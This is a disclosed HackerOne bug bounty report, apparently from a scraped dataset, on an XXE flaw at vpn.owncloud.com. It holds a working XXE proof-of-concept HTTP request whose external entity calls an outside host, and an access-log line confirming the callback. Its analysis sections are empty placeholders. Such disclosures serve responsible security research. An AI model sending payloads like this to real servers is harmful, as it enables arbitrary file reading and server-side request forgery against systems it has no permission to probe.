---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '105980'
original_report_id: '105980'
title: XXE at host vpn.owncloud.com
weakness: Command Injection - Generic
team_handle: owncloud
created_at: '2015-12-18T20:03:03.088Z'
disclosed_at: '2016-01-27T20:06:09.507Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- command-injection-generic
---

# XXE at host vpn.owncloud.com

## Metadata

- HackerOne Report ID: 105980
- Weakness: Command Injection - Generic
- Program: owncloud
- Disclosed At: 2016-01-27T20:06:09.507Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Improper XML parser configuration provide attacker to read arbitrary files and make HTTP requests from server side.

Exploit example is listed below:
```
POST /user/login HTTP/1.1
Host: 144.76.105.208
Accept: */*
Content-type: application/xml
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 163

<?xml version="1.0"?>
<!DOCTYPE a [
<!ENTITY % select SYSTEM "http://wallarm.tools/ok">
%select;
]>
<a>wlrm-scnr</a>
```

From access.log on this server:
2a01:4f8:192:50d6::2 - - [18/Dec/2015:21:11:47 +0300] "GET /ok HTTP/1.0" 200 227 "-" "-"

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
